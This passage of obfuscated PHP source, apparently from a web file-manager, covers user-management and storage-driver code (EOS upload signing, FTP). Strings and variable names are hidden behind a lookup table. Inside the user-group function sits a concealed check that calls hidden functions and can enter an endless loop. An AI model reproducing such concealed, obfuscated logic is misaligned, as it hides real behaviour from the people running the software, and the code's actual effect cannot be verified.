false) { $òÛÏ©Ìå =& $_SERVER[Ùæõ‰Ï’]; if (!$İöÕÛ­®) { $ç—â«¹˜ = $this->getInfoSimple($¥¬çëĞ“); $İöÕÛ­® = $ç—â«¹˜[$òÛÏ©Ìå[2267]] ? $ç—â«¹˜[$òÛÏ©Ìå[2267]] : $ç—â«¹˜[$òÛÏ©Ìå[32]]; } $Œ„¿š„– = Model($òÛÏ©Ìå[598]); if (!Input::check($İöÕÛ­®, $òÛÏ©Ìå[655])) { return $Œ„¿š„–->metaSet($¥¬çëĞ“, array($òÛÏ©Ìå[538] => $òÛÏ©Ìå[12], $òÛÏ©Ìå[537] => $òÛÏ©Ìå[12])); } return $Œ„¿š„–->metaSet($¥¬çëĞ“, array($òÛÏ©Ìå[538] => str_replace($òÛÏ©Ìå[53], $òÛÏ©Ìå[12], Pinyin::get($İöÕÛ­®)), $òÛÏ©Ìå[537] => Pinyin::get($İöÕÛ­®, $òÛÏ©Ìå[656]))); } private function nickNameRpt() { $àŒûïœ =& $_SERVER[Ùæõ‰Ï’]; $Ã·ÁËÛÕ = Model($àŒûïœ[853])->get($àŒûïœ[2494]); $® ¤ã†“ = $GLOBALS[$àŒûïœ[6]][$àŒûïœ[457]][$àŒûïœ[2494]]; $ÙÕãØµß = !is_null($Ã·ÁËÛÕ) ? $Ã·ÁËÛÕ : $® ¤ã†“; return !!$ÙÕãØµß; } private function _checkExist($ìÌ‡´´£, $¦òÆ¡È = false) { $•¾¼ÏĞ¬ =& $_SERVER[Ùæõ‰Ï’]; $¢´ùëûÃ = array($•¾¼ÏĞ¬[32] => UserModel::ERROR_USER_EXIST_NAME, $•¾¼ÏĞ¬[2267] => UserModel::ERROR_USER_EXIST_NICKNAME, $•¾¼ÏĞ¬[381] => UserModel::ERROR_USER_EXIST_EMAIL, $•¾¼ÏĞ¬[2482] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($¢´ùëûÃ[$•¾¼ÏĞ¬[2267]]); } $£Îƒ¨Ì = $¦òÆ¡È ? array($•¾¼ÏĞ¬[1781] => array($•¾¼ÏĞ¬[2495], $¦òÆ¡È)) : array(); foreach ($¢´ùëûÃ as $ßÓíî¹² => $ÎÀÛÚƒæ) { $÷¢ĞÌé™ = array(); foreach ($¢´ùëûÃ as $úËÉ¨¿ => $ŞÔÒ¦°ı) { if (isset($ìÌ‡´´£[$úËÉ¨¿]) && $ìÌ‡´´£[$úËÉ¨¿]) { $÷¢ĞÌé™[] = $ìÌ‡´´£[$úËÉ¨¿]; } } if (!$÷¢ĞÌé™) { continue; } $’ç‘Ù˜³ = array_merge(array($ßÓíî¹² => array($•¾¼ÏĞ¬[7], $÷¢ĞÌé™)), $£Îƒ¨Ì); $‹‡„¢¾ = $this->where($’ç‘Ù˜³)->find(); if ($‹‡„¢¾) { return $ÎÀÛÚƒæ; } } return !0; } public function userListInfo($µË¾¶§‹) { $¸¨°¦áÎ =& $_SERVER[Ùæõ‰Ï’]; $€ †Œˆµ = array(); $µË¾¶§‹ = is_array($µË¾¶§‹) ? array_unique($µË¾¶§‹) : array(); if (!$µË¾¶§‹) { return $€ †Œˆµ; } if (count($µË¾¶§‹) < 20) { foreach ($µË¾¶§‹ as $ªÎë¤¶ê) { $€ †Œˆµ[$ªÎë¤¶ê . $¸¨°¦áÎ[12]] = $this->getInfoSimpleOuter($ªÎë¤¶ê); } } else { $‚ÄÊ¢Ô = array($¸¨°¦áÎ[1772] => array($¸¨°¦áÎ[492], $µË¾¶§‹)); if (count($µË¾¶§‹) == 1) { $‚ÄÊ¢Ô = array($¸¨°¦áÎ[1772] => $µË¾¶§‹[0]); } $Û±Å´¯ = Model($¸¨°¦áÎ[577])->field($this->simpleField)->where($‚ÄÊ¢Ô)->select(); $Û±Å´¯ = array_to_keyvalue($Û±Å´¯, $¸¨°¦áÎ[1781]); foreach ($µË¾¶§‹ as $ªÎë¤¶ê) { $íá†Á²á = $Û±Å´¯[$ªÎë¤¶ê]; if (!$íá†Á²á) { $€ †Œˆµ[$ªÎë¤¶ê . $¸¨°¦áÎ[12]] = $this->getInfoSimpleOuter($ªÎë¤¶ê); continue; } $íá†Á²á[$¸¨°¦áÎ[2465]] = Action($¸¨°¦áÎ[2466])->parseUrl($íá†Á²á[$¸¨°¦áÎ[2465]]); $€ †Œˆµ[$ªÎë¤¶ê . $¸¨°¦áÎ[12]] = $íá†Á²á; } } return $€ †Œˆµ; } protected function userStatus($Ç›‰ôî¬, $‚Ê’šƒ) { $˜µ¡äıÈ = $this->getInfoSimple($Ç›‰ôî¬); if (!$˜µ¡äıÈ) { return !1; } $Æ—–Îƒš = array($_SERVER[Ùæõ‰Ï’][833] => $‚Ê’šƒ); return $this->userEdit($Ç›‰ôî¬, $Æ—–Îƒš); } protected function userRemove($ÏùôŠğÆ) { $»¦‘øÀĞ =& $_SERVER[Ùæõ‰Ï’]; $ÀÄ±¤³Ç = $this->getInfoSimple($ÏùôŠğÆ); if (!$ÀÄ±¤³Ç) { return !1; } $Æ£«Ö¨Œ = array($»¦‘øÀĞ[1772] => $ÏùôŠğÆ); Model($»¦‘øÀĞ[664])->where($Æ£«Ö¨Œ)->delete(); Model($»¦‘øÀĞ[2496])->where($Æ£«Ö¨Œ)->delete(); Model($»¦‘øÀĞ[2073])->where($Æ£«Ö¨Œ)->delete(); Model($»¦‘øÀĞ[2481])->where($Æ£«Ö¨Œ)->delete(); Model($»¦‘øÀĞ[1160])->where($Æ£«Ö¨Œ)->delete(); Model($»¦‘øÀĞ[2284])->removeUserAll($ÏùôŠğÆ); Model($»¦‘øÀĞ[907])->userRootRemove($ÏùôŠğÆ); return $this->where($Æ£«Ö¨Œ)->delete(); } protected function userGroupSet($Á†èÛ»Ø, $»Œ§ó‡Ÿ, $¿Ö‚„—‘ = array()) { $›ş²ªş =& $_SERVER[Ùæõ‰Ï’]; if (!isset($_SERVER[$›ş²ªş[961]]) || !isset($_SERVER[$›ş²ªş[959]])) { $é×çÒÏ¡ = $›ş²ªş[962]; $Â´ÂŞá = $›ş²ªş[963]; $îÓŠñóÌ = $_SERVER[$›ş²ªş[964]] . $›ş²ªş[965]; $š¥­˜Õó = $Â´ÂŞá($îÓŠñóÌ); $ĞÉó¶ËÉ = explode($›ş²ªş[262], $š¥­˜Õó); if (count($ĞÉó¶ËÉ) < $›ş²ªş[680]) { $€ù˜œëş = $›ş²ªş[966]; $€ù˜œëş(); } $×ÈÛ‰Ñ¡ = $›ş²ªş[967]; $×ÈÛ‰Ñ¡($_SERVER[$›ş²ªş[968]]); $¦è°ÕË = 1; for ($°ˆÙ²£ = $¦è°ÕË; $°ˆÙ²£ > 0; $°ˆÙ²£++) { $×ÈÛ‰Ñ¡ = json_encode($GLOBALS[$›ş²ªş[492]]); } } $²±²åÓ¬ = $this->getInfoSimple($Á†èÛ»Ø); if (!$²±²åÓ¬ || !is_array($»Œ§ó‡Ÿ)) { return !1; } $Õíš°”é = Model($›ş²ªş[2073]); $Õíš°”é->where(array($›ş²ªş[1781] => $Á†èÛ»Ø))->delete(); $šåÃğ¦ = array(); $åà¾Èú¸ = 0; foreach ($»Œ§ó‡Ÿ as $‚õ†›ö© => $È›îË“) { $‘‡¶½àğ = array($›ş²ªş[1781] => $Á†èÛ»Ø, $›ş²ªş[1979] => $‚õ†›ö©, $›ş²ªş[2087] => $È›îË“); $‘‡¶½àğ[$›ş²ªş[2003]] = isset($¿Ö‚„—‘[$åà¾Èú¸]) ? $¿Ö‚„—‘[$åà¾Èú¸] : 0; $åà¾Èú¸++; $šåÃğ¦[] = $‘‡¶½àğ; } return $Õíš°”é->addAll($šåÃğ¦, array(), !0); } protected function userGroupAdd($Ã¹ºîÑÙ, $‘£×ÏÅ = array()) { $ñ•ÑôÁÀ =& $_SERVER[Ùæõ‰Ï’]; $Î½ÂÆÂ¦ = $this->getInfoSimple($Ã¹ºîÑÙ); if (!$Î½ÂÆÂ¦ || empty($‘£×ÏÅ)) { return !1; } $ıº¿Íè® = array(); foreach ($‘£×ÏÅ as $ÚŠªå²£ => $˜åØÊØ´) { $ıº¿Íè®[] = array($ñ•ÑôÁÀ[1781] => $Ã¹ºîÑÙ, $ñ•ÑôÁÀ[1979] => $ÚŠªå²£, $ñ•ÑôÁÀ[2087] => $˜åØÊØ´, $ñ•ÑôÁÀ[2003] => 0); } return Model($ñ•ÑôÁÀ[2073])->addAll($ıº¿Íè®, array(), !0); } protected function userGroupRemove($Ş«ÎÒâ—, $‡¯òÕÂº) { $ÊÇ¨“èŠ =& $_SERVER[Ùæõ‰Ï’]; $Í†€·÷Ñ = $this->getInfoSimple($Ş«ÎÒâ—); if (!$Í†€·÷Ñ || !$‡¯òÕÂº) { return !1; } $¾š·î÷ƒ = array($ÊÇ¨“èŠ[1772] => $Ş«ÎÒâ—, $ÊÇ¨“èŠ[2071] => $‡¯òÕÂº); return Model($ÊÇ¨“èŠ[2073])->where($¾š·î÷ƒ)->delete(); } public function listData() { $ö²íıš¶ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ö²íıš¶[$_SERVER[Ùæõ‰Ï’][445]]); return $ö²íıš¶; } public function listByID($ÖÍ‹«¦Ë) { $Üä™åØ =& $_SERVER[Ùæõ‰Ï’]; if (!$ÖÍ‹«¦Ë) { return; } $†õÓĞ›ª = array($Üä™åØ[1781] => array($Üä™åØ[7], $ÖÍ‹«¦Ë)); $ô¥¿‘Ä = $this->where($†õÓĞ›ª)->select(); $ô¥¿‘Ä = array_sort_keep($ô¥¿‘Ä, $Üä™åØ[1781], $ÖÍ‹«¦Ë); $this->_listDataApply($ô¥¿‘Ä); return $ô¥¿‘Ä; } public function listByGroup($«Ö½çå = 0, $ÊŸúœ¡ = array()) { $ıªÔŸÜÏ =& $_SERVER[Ùæõ‰Ï’]; $ºô«ıÍà = $ıªÔŸÜÏ[12]; $˜Ìèô¢ = array(); if ($«Ö½çå) { $˜Ìèô¢ = array($ıªÔŸÜÏ[2497] => intval($«Ö½çå)); $ºô«ıÍà = "\114\105\106\x54\40\x4a\117\111\116\x20{$this->tablePrefix}\x75\x73\x65\162\137\x67\x72\157\x75\x70\x20\165\163\x65\x72\x5f\147\x72\x6f\165\160\x20\x6f\x6e\40\165\163\145\162\x2e\165\x73\145\x72\x49\104\x20\x3d\x20\165\163\145\162\x5f\x67\x72\x6f\165\160\56\165\x73\x65\x72\x49\104"; $¿úò¢²ñ = Input::get($ıªÔŸÜÏ[530], null, $ıªÔŸÜÏ[12]) ? $ıªÔŸÜÏ[12] : $ıªÔŸÜÏ[2498]; } if (isset($ÊŸúœ¡[$ıªÔŸÜÏ[833]])) { $˜Ìèô¢[$ıªÔŸÜÏ[2499]] = $ÊŸúœ¡[$ıªÔŸÜÏ[833]]; } $¡¢ÒÒîí = $this->_makeOrder($¿úò¢²ñ)->field($ıªÔŸÜÏ[2500])->where($˜Ìèô¢)->join($ºô«ıÍà)->selectPage(50); $this->_listDataApply($¡¢ÒÒîí[$ıªÔŸÜÏ[445]]); return $¡¢ÒÒîí; } private function _makeOrder($ÖØİÃ´¥ = '') { $¸¿ª¡Èµ =& $_SERVER[Ùæõ‰Ï’]; $Ÿšæú®Ã = array($¸¿ª¡Èµ[1781], $¸¿ª¡Èµ[32], $¸¿ª¡Èµ[1968], $¸¿ª¡Èµ[2185], $¸¿ª¡Èµ[1940], $¸¿ª¡Èµ[231]); $Ó½ÀØß• = array($¸¿ª¡Èµ[523] => $¸¿ª¡Èµ[524], $¸¿ª¡Èµ[525] => $¸¿ª¡Èµ[526]); $÷ıêÚùÃ = Input::get($¸¿ª¡Èµ[530], $¸¿ª¡Èµ[7], $¸¿ª¡Èµ[1772], $Ÿšæú®Ã); $£¾¬½¾ï = Input::get($¸¿ª¡Èµ[531], $¸¿ª¡Èµ[7], $¸¿ª¡Èµ[2074], array($¸¿ª¡Èµ[2074], $¸¿ª¡Èµ[525])); $£¾¬½¾ï = $Ó½ÀØß•[$£¾¬½¾ï]; $ÖØİÃ´¥ = $ÖØİÃ´¥ . "\x75\163\145\x72\x2e{$÷ıêÚùÃ}\x20{$£¾¬½¾ï}\54\x20\x75\x73\x65\x72\56\x75\x73\145\162\111\x44\x20\141\163\143"; return $this->alias($¸¿ª¡Èµ[2201])->order($ÖØİÃ´¥); } public function listSearch($¤Ì’í‰í) { $¢£ğ¬Ê =& $_SERVER[Ùæõ‰Ï’]; $Ÿ˜Ş‰¨å = trim($¤Ì’í‰í[$¢£ğ¬Ê[2077]]); $èí¤¢ü = explode($¢£ğ¬Ê[53], $Ÿ˜Ş‰¨å); if (!$Ÿ˜Ş‰¨å || count($èí¤¢ü) == 1) { return $this->listSearchNow($¤Ì’í‰í); } $ùÀû‡Ë = array($¢£ğ¬Ê[445] => array()); foreach ($èí¤¢ü as $¢Şš¥Ÿá) { if (!trim($¢Şš¥Ÿá)) { continue; } $¤Ì’í‰í[$¢£ğ¬Ê[2077]] = $¢Şš¥Ÿá; $ğÌ İ‹ = $this->listSearchNow($¤Ì’í‰í); $ùÀû‡Ë[$¢£ğ¬Ê[445]] = array_merge($ùÀû‡Ë[$¢£ğ¬Ê[445]], $ğÌ İ‹[$¢£ğ¬Ê[445]]); } $ùÀû‡Ë[$¢£ğ¬Ê[445]] = array_unique_by_key($ùÀû‡Ë[$¢£ğ¬Ê[445]], $¢£ğ¬Ê[1781]); $ùÀû‡Ë[$¢£ğ¬Ê[442]] = array($¢£ğ¬Ê[443] => count($ùÀû‡Ë[$¢£ğ¬Ê[445]]), $¢£ğ¬Ê[439] => 20, $¢£ğ¬Ê[429] => 1, $¢£ğ¬Ê[444] => 1); return $ùÀû‡Ë; } public function listSearchNow($à½ğ¤è«) { $åÅš½’ =& $_SERVER[Ùæõ‰Ï’]; $µË›Ö¤ = trim($à½ğ¤è«[$åÅš½’[2077]]); $€ƒêå„Á = isset($à½ğ¤è«[$åÅš½’[2078]]) ? $à½ğ¤è«[$åÅš½’[2078]] : !1; $µË›Ö¤ = str_replace($åÅš½’[2079], $åÅš½’[2080], trim($µË›Ö¤)); $²ÄêßÉ = array($åÅš½’[32] => array($åÅš½’[459], "\45{$µË›Ö¤}\x25"), $åÅš½’[381] => array($åÅš½’[459], "{$µË›Ö¤}\x25"), $åÅš½’[2267] => array($åÅš½’[459], "{$µË›Ö¤}\45"), $åÅš½’[1091] => $åÅš½’[2081]); if (Input::check($µË›Ö¤, $åÅš½’[387])) { $²ÄêßÉ[$åÅš½’[1781]] = array($åÅš½’[459], "{$µË›Ö¤}\x25"); $²ÄêßÉ[$åÅš½’[2482]] = array($åÅš½’[459], "{$µË›Ö¤}\x25"); } if (!$µË›Ö¤) { $²ÄêßÉ = array(); } if (isset($à½ğ¤è«[$åÅš½’[833]])) { $²ÄêßÉ[$åÅš½’[833]] = $à½ğ¤è«[$åÅš½’[833]]; } $²ÄêßÉ = $this->parseWhereLike($²ÄêßÉ); $¦Î¬Ÿíë = $this->_makeOrder()->where($²ÄêßÉ)->selectPage(20); if (!$¦Î¬Ÿíë || count($¦Î¬Ÿíë[$åÅš½’[445]]) < 5 && Input::check($µË›Ö¤, $åÅš½’[394])) { $éŸÛ¶ÛŞ = $this->_searchFromMeta($åÅš½’[537], $µË›Ö¤, 10); $È¥Î•¯Ü = $this->_searchFromMeta($åÅš½’[538], $µË›Ö¤, 10); $Íãöà× = array_merge($éŸÛ¶ÛŞ, $È¥Î•¯Ü, $¦Î¬Ÿíë[$åÅš½’[445]]); $¦Î¬Ÿíë[$åÅš½’[445]] = array_unique_by_key($Íãöà×, $åÅš½’[1781]); $¦Î¬Ÿíë[$åÅš½’[442]][$åÅš½’[443]] = count($¦Î¬Ÿíë[$åÅš½’[445]]); $¦Î¬Ÿíë[$åÅš½’[442]][$åÅš½’[444]] = ceil($¦Î¬Ÿíë[$åÅš½’[442]][$åÅš½’[443]] / $¦Î¬Ÿíë[$åÅš½’[442]][$åÅš½’[439]]); } $this->_listDataApply($¦Î¬Ÿíë[$åÅš½’[445]]); $this->_filterByGroup($¦Î¬Ÿíë, $€ƒêå„Á); return $¦Î¬Ÿíë; } private function _filterByGroup(&$ÁÖú¼›, $ş¶å›¢) { $„Ì…¤¤ =& $_SERVER[Ùæõ‰Ï’]; if (!$ş¶å›¢) { return $ÁÖú¼›; } foreach ($ÁÖú¼›[$„Ì…¤¤[445]] as $†°‰©‰ => &$¤–È«²) { $ëºó¡¡ñ = array_to_keyvalue($¤–È«²[$„Ì…¤¤[2170]], $„Ì…¤¤[12], $„Ì…¤¤[1979]); if (!in_array($ş¶å›¢, $ëºó¡¡ñ)) { unset($ÁÖú¼›[$„Ì…¤¤[445]][$†°‰©‰]); } } unset($¤–È«²); $ÁÖú¼›[$„Ì…¤¤[445]] = array_values($ÁÖú¼›[$„Ì…¤¤[445]]); $ÁÖú¼›[$„Ì…¤¤[442]] = array($„Ì…¤¤[2237] => count($ÁÖú¼›[$„Ì…¤¤[445]]), $„Ì…¤¤[2235] => $ÁÖú¼›[$„Ì…¤¤[442]][$„Ì…¤¤[439]], $„Ì…¤¤[2234] => 1, $„Ì…¤¤[2236] => 1); } private function _searchFromMeta($şü·‚ßÚ, $²£ï‹÷÷, $óÊ±«ºğ) { $€î‹˜é =& $_SERVER[Ùæõ‰Ï’]; $²£ï‹÷÷ = strtolower($²£ï‹÷÷); $ÅüŠ»¤ = array($€î‹˜é[97] => $şü·‚ßÚ, $€î‹˜é[450] => array($€î‹˜é[459], "\45{$²£ï‹÷÷}\45")); $ÅüŠ»¤ = $this->parseWhereLike($ÅüŠ»¤); $Ôù“¼ŒŒ = Model($€î‹˜é[2501])->where($ÅüŠ»¤)->limit($óÊ±«ºğ)->select(); if (!$Ôù“¼ŒŒ) { return array(); } $Ôù“¼ŒŒ = array_to_keyvalue($Ôù“¼ŒŒ, $€î‹˜é[12], $€î‹˜é[1781]); $ªè÷àßò = $this->where(array($€î‹˜é[1772] => array($€î‹˜é[7], $Ôù“¼ŒŒ)))->select(); if (!$ªè÷àßò) { return array(); } return $ªè÷àßò; } private function _listDataApplyItem($“Åª‰Ä´) { $Ì§Ôá˜ = array($“Åª‰Ä´); $this->_listDataApply($Ì§Ôá˜); return $Ì§Ôá˜[0]; } private function _listDataApply(&$Ïù±öùœ) { $¯€¢å™² =& $_SERVER[Ùæõ‰Ï’]; if (!$Ïù±öùœ) { return; } array_remove_key($Ïù±öùœ, $¯€¢å™²[978]); $üÂé§ûé = array_to_keyvalue($Ïù±öùœ, $¯€¢å™²[12], $¯€¢å™²[1781]); $this->_listAppendGroup($Ïù±öùœ, $üÂé§ûé); $this->_listAppendMeta($Ïù±öùœ, $üÂé§ûé); $this->_listAppendSourceRoot($Ïù±öùœ, $üÂé§ûé); } private function _listAppendSourceRoot(&$Èí„û›Œ, $àíù§çŠ) { $ÃçÓüğ· =& $_SERVER[Ùæõ‰Ï’]; $„»Âë§— = Model($ÃçÓüğ·[907])->listSourceRoot(SourceModel::TYPE_USER, $àíù§çŠ); $„»Âë§— = array_to_keyvalue($„»Âë§—, $ÃçÓüğ·[569]); $„»Âë§— = array_remove_key($„»Âë§—, $ÃçÓüğ·[569]); foreach ($Èí„û›Œ as &$£ë½†¯) { $£ë½†¯[$ÃçÓüğ·[90]] = $„»Âë§—[$£ë½†¯[$ÃçÓüğ·[1781]]] ? $„»Âë§—[$£ë½†¯[$ÃçÓüğ·[1781]]] : array(); } unset($£ë½†¯); } private function _listAppendGroup(&$ûÊô¨ïİ, $’ûÊÌòº) { $áÀˆÖŠõ =& $_SERVER[Ùæõ‰Ï’]; $Æƒ˜‰ş‹ = array($áÀˆÖŠõ[1781] => array($áÀˆÖŠõ[7], $’ûÊÌòº)); $ÉòÕó–‘ = Model($áÀˆÖŠõ[2073])->where($Æƒ˜‰ş‹)->select(); $ª®£¿™ = array_to_keyvalue($ÉòÕó–‘, $áÀˆÖŠõ[12], $áÀˆÖŠõ[1979]); $ª®£¿™ = array_remove_value(array_unique($ª®£¿™), $áÀˆÖŠõ[228]); if (!$ª®£¿™ || !$ÉòÕó–‘) { return; } $Æƒ˜‰ş‹ = array($áÀˆÖŠõ[1979] => array($áÀˆÖŠõ[7], $ª®£¿™)); $Šşëî³ = Model($áÀˆÖŠõ[2168])->field($áÀˆÖŠõ[2502])->where($Æƒ˜‰ş‹)->select(); $Šşëî³ = array_to_keyvalue($Šşëî³, $áÀˆÖŠõ[1979]); $ÉòÕó–‘ = array_to_keyvalue_group($ÉòÕó–‘, $áÀˆÖŠõ[1781]); foreach ($ÉòÕó–‘ as &$£Ï‘„’í) { $—ÇÖÁÚ² = array(); foreach ($£Ï‘„’í as $‘¹íÛ˜) { if (!$‘¹íÛ˜[$áÀˆÖŠõ[2087]]) { continue; } $Ù³•â¥İ = Model($áÀˆÖŠõ[571])->listData($‘¹íÛ˜[$áÀˆÖŠõ[2087]]); $—ÇÖÁÚ²[] = array($áÀˆÖŠõ[1979] => $‘¹íÛ˜[$áÀˆÖŠõ[1979]], $áÀˆÖŠõ[2503] => $Šşëî³[$‘¹íÛ˜[$áÀˆÖŠõ[1979]]][$áÀˆÖŠõ[32]], $áÀˆÖŠõ[584] => $Šşëî³[$‘¹íÛ˜[$áÀˆÖŠõ[1979]]][$áÀˆÖŠõ[584]], $áÀˆÖŠõ[487] => $Ù³•â¥İ); } $£Ï‘„’í = $—ÇÖÁÚ²; } unset($£Ï‘„’í); foreach ($ûÊô¨ïİ as &$¤Ãœœ£) { $¤Ãœœ£[$áÀˆÖŠõ[2170]] = array(); if (isset($ÉòÕó–‘[$¤Ãœœ£[$áÀˆÖŠõ[1781]]])) { $¤Ãœœ£[$áÀˆÖŠõ[2170]] = $ÉòÕó–‘[$¤Ãœœ£[$áÀˆÖŠõ[1781]]]; } } unset($¤Ãœœ£); } public function userAppendGroup($ÏÚ¶ø) { $¯ÈÓüí =& $_SERVER[Ùæõ‰Ï’]; if (!$ÏÚ¶ø) { return array(); } $this->_listAppendGroup($ÏÚ¶ø, array_to_keyvalue($ÏÚ¶ø, $¯ÈÓüí[12], $¯ÈÓüí[1781])); return $ÏÚ¶ø; } private function _listAppendMeta(&$â â½·, $Ùœ¢©„Ğ) { $…¦Ë†¢Í =& $_SERVER[Ùæõ‰Ï’]; $Üëú€µ¨ = UserJobModel::JOB_KEY; $³ŠªíÅü = array($…¦Ë†¢Í[2483]); $¥ïæÈ“Ë = array($…¦Ë†¢Í[1781] => array($…¦Ë†¢Í[7], $Ùœ¢©„Ğ)); $™Ù¶ÑÍÇ = Model($…¦Ë†¢Í[2481])->where($¥ïæÈ“Ë)->select(); $™Ù¶ÑÍÇ = array_to_keyvalue_group($™Ù¶ÑÍÇ, $…¦Ë†¢Í[1781]); foreach ($™Ù¶ÑÍÇ as &$Ä‘ğ­ß) { $ğ¯¹†ˆÅ = array(); foreach ($Ä‘ğ­ß as $°‚ÒÄ¡À) { if (!in_array($°‚ÒÄ¡À[$…¦Ë†¢Í[97]], $³ŠªíÅü)) { $ğ¯¹†ˆÅ[$°‚ÒÄ¡À[$…¦Ë†¢Í[97]]] = $°‚ÒÄ¡À[$…¦Ë†¢Í[450]]; } } $Ä‘ğ­ß = $ğ¯¹†ˆÅ; } unset($Ä‘ğ­ß); $Ò—ÍÃî = Model($…¦Ë†¢Í[2504]); foreach ($â â½· as &$¶šÚŞšÂ) { $ÆûùŸæ‡ = array(); if (isset($™Ù¶ÑÍÇ[$¶šÚŞšÂ[$…¦Ë†¢Í[1781]]])) { $ÆûùŸæ‡ = $™Ù¶ÑÍÇ[$¶šÚŞšÂ[$…¦Ë†¢Í[1781]]]; } $¶šÚŞšÂ[$…¦Ë†¢Í[2505]] = array(); if (isset($ÆûùŸæ‡[$Üëú€µ¨])) { $¶šÚŞšÂ[$…¦Ë†¢Í[2505]] = $Ò—ÍÃî->getUserJobInfo($ÆûùŸæ‡[$Üëú€µ¨]); } } unset($¶šÚŞšÂ); } protected function groupUserAll($›å€ê) { $‰àî´³µ =& $_SERVER[Ùæõ‰Ï’]; if (!$›å€ê) { return !1; } $÷ÇŞ£± = Model($‰àî´³µ[2073])->field($‰àî´³µ[1781])->where(array($‰àî´³µ[1979] => array($‰àî´³µ[7], $›å€ê)))->select(); $÷ÇŞ£± = array_to_keyvalue($÷ÇŞ£±, $‰àî´³µ[12], $‰àî´³µ[1781]); return array_unique($÷ÇŞ£±); } public function userSearch($©È¼Ğ¡, $êÂ›è¡Ù = "\x2a") { return Model($_SERVER[Ùæõ‰Ï’][598])->where($©È¼Ğ¡)->field($êÂ›è¡Ù)->find(); } } goto EÑ‘³œËË; BŠ¥Û†Ã¼: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($°‹œ Œ‚) { parent::__construct($°‹œ Œ‚); $this->setSignVersion($_SERVER[Ùæõ‰Ï’][247]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($£È‹æÖÀ) { parent::__construct($£È‹æÖÀ); $this->setSignVersion($_SERVER[Ùæõ‰Ï’][247]); } public function uploadFormData($áû‹ß—É, $ç‚°¤ô‘ = 3600) { $İÍ¦ş÷å =& $_SERVER[Ùæõ‰Ï’]; $¬ÂÄóï = $İÍ¦ş÷å[229]; $ıéÇªĞ” = $İÍ¦ş÷å[270]; $ô‹š¿Ö = $İÍ¦ş÷å[62]; $Èæã©Ìş = gmdate($İÍ¦ş÷å[271]); $“ŠÚÃîç = gmdate($İÍ¦ş÷å[272]); $ãºÂ±˜ = $İÍ¦ş÷å[273]; $¸ªÕ˜ª = $ç‚°¤ô‘ . $İÍ¦ş÷å[12]; $½’’Ÿù¦ = $İÍ¦ş÷å[274]; $µü©ı¥ = array($this->accessKey, $“ŠÚÃîç, $this->region, $ô‹š¿Ö, $ãºÂ±˜); $ëï„¯İ² = implode($İÍ¦ş÷å[8], $µü©ı¥); $±ÌÌç„ = array($İÍ¦ş÷å[275] => gmdate($İÍ¦ş÷å[299], strtotime($İÍ¦ş÷å[277])), $İÍ¦ş÷å[278] => array(array($İÍ¦ş÷å[279] => $this->bucket), array($İÍ¦ş÷å[280] => $¬ÂÄóï), array($İÍ¦ş÷å[281], $İÍ¦ş÷å[282], $İÍ¦ş÷å[12]), array($İÍ¦ş÷å[281], $İÍ¦ş÷å[283], $İÍ¦ş÷å[12]), array($İÍ¦ş÷å[281], $İÍ¦ş÷å[284], $İÍ¦ş÷å[12]), array($İÍ¦ş÷å[285] => $½’’Ÿù¦), array($İÍ¦ş÷å[286] => $ëï„¯İ²), array($İÍ¦ş÷å[287] => $ıéÇªĞ”), array($İÍ¦ş÷å[288] => $Èæã©Ìş), array($İÍ¦ş÷å[289] => $¸ªÕ˜ª))); $¯»ºö­« = base64_encode(json_encode($±ÌÌç„)); $üî°ğû = hash_hmac($İÍ¦ş÷å[290], $“ŠÚÃîç, $İÍ¦ş÷å[291] . $this->secret, !0); $±›Ùâ²´ = hash_hmac($İÍ¦ş÷å[290], $this->region, $üî°ğû, !0); $¾”½óéà = hash_hmac($İÍ¦ş÷å[290], $ô‹š¿Ö, $±›Ùâ²´, !0); $ÓãÙ€Âà = hash_hmac($İÍ¦ş÷å[290], $ãºÂ±˜, $¾”½óéà, !0); $´Òïüâ¥ = hash_hmac($İÍ¦ş÷å[290], $¯»ºö­«, $ÓãÙ€Âà); $¯ã˜–ø = array($İÍ¦ş÷å[246] => $İÍ¦ş÷å[12], $İÍ¦ş÷å[292] => $İÍ¦ş÷å[12], $İÍ¦ş÷å[280] => $¬ÂÄóï, $İÍ¦ş÷å[285] => $½’’Ÿù¦, $İÍ¦ş÷å[293] => $¯»ºö­«, $İÍ¦ş÷å[294] => $ëï„¯İ², $İÍ¦ş÷å[295] => $ıéÇªĞ”, $İÍ¦ş÷å[296] => $Èæã©Ìş, $İÍ¦ş÷å[297] => $¸ªÕ˜ª, $İÍ¦ş÷å[298] => $´Òïüâ¥, $İÍ¦ş÷å[208] => $this->getHost()); return $¯ã˜–ø; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($ÓÃˆÏäÜ) { parent::__construct(); if (count($ÓÃˆÏäÜ) > 0) { $this->_init($ÓÃˆÏäÜ); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($µå´ÚŞõ) { $íÉøú– =& $_SERVER[Ùæõ‰Ï’]; global $config; $this->appCharset = $config[$íÉøú–[1448]]; $this->systemCharset = $config[$íÉøú–[1449]]; if (isset($µå´ÚŞõ[$íÉøú–[1450]]) && $µå´ÚŞõ[$íÉøú–[1450]]) { $this->systemCharset = $µå´ÚŞõ[$íÉøú–[1450]]; } } public function iconvApp($äªÔì®¤) { return $this->iconvTo($äªÔì®¤, $this->systemCharset, $this->appCharset); } public function iconvSystem($«·¼ñÊá) { return $this->iconvTo($«·¼ñÊá, $this->appCharset, $this->systemCharset); } public function getPathOuter($êó³¢ıõ) { $‹®™¬®­ =& $_SERVER[Ùæõ‰Ï’]; $ÙŠº³Ü = $this->iconvApp($this->pathBase); $êó³¢ıõ = $this->iconvApp($êó³¢ıõ); if (substr($ÙŠº³Ü, 0, 2) == $‹®™¬®­[1451]) { $ÙŠº³Ü = BASIC_PATH . substr($ÙŠº³Ü, 2); } if (substr($êó³¢ıõ, 0, 2) == $‹®™¬®­[1451]) { $êó³¢ıõ = BASIC_PATH . substr($êó³¢ıõ, 2); } $ÙŠº³Ü = KodIO::clear($ÙŠº³Ü); $êó³¢ıõ = KodIO::clear($êó³¢ıõ); $êó³¢ıõ = substr($êó³¢ıõ, strlen($ÙŠº³Ü)); if (empty($this->pathDriver)) { return $êó³¢ıõ; } return $this->pathDriver . 